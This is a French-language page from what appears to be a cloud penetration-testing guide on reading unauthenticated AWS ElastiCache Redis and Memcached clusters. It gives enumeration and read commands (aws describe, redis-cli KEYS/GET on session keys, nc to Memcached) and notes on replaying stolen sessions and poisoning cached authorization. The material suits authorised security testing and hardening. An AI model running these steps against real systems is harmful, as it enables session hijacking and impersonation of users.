---
title: "ElastiCache : lire des instances Redis et Memcached non authentifiées"
order: 7
description: "Accéder à des clusters ElastiCache Redis et Memcached non authentifiés ou exposés pour lire les données en cache."
keywords:
  - ElastiCache
  - Redis
  - Memcached
  - cluster
  - cache
---

# ElastiCache

ElastiCache exécute Redis et Memcached, qui sont livrés sans authentification par défaut. Un cluster joignable depuis un hôte VPC compromis est généralement lisible sans aucun identifiant, et le cache contient souvent des sessions, des jetons et des résultats de requête plus immédiatement utiles que la base de données qui se trouve derrière lui.

## Trouver et lire

```bash
aws elasticache describe-cache-clusters --show-cache-node-info \
  --query 'CacheClusters[].[CacheClusterId,Engine,CacheNodes[].Endpoint.Address]'

# Redis with no AUTH configured
redis-cli -h <endpoint> -p 6379
> KEYS *
> GET session:<id>

# Memcached
echo -e 'stats items\nquit' | nc <endpoint> 11211
```

## Notes d'exploitation

- Redis AUTH et le TLS en transit sont désactivés sauf activation explicite, de sorte qu'un point de terminaison joignable est généralement une lecture directe.
- Les caches de sessions et de jetons sont les clés à forte valeur : une session en cache se rejoue souvent directement dans l'application en tant qu'un autre utilisateur.
- Lorsque Redis est accessible en écriture, empoisonner des décisions d'autorisation mises en cache est une élévation au niveau applicatif.

## Outils

- **AWS CLI** (`elasticache describe-cache-clusters`).
- **redis-cli / nc** : accès natif une fois le cluster joignable.

## Références

- [AWS: ElastiCache in-transit encryption and AUTH](https://docs.aws.amazon.com/AmazonElastiCache/latest/red-ug/encryption.html)
- [HackTricks Cloud: AWS ElastiCache](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [CloudFox: enumerating reachable cloud data stores](https://github.com/BishopFox/cloudfox)
- [Hacking the Cloud: AWS offensive techniques](https://hackingthe.cloud/)
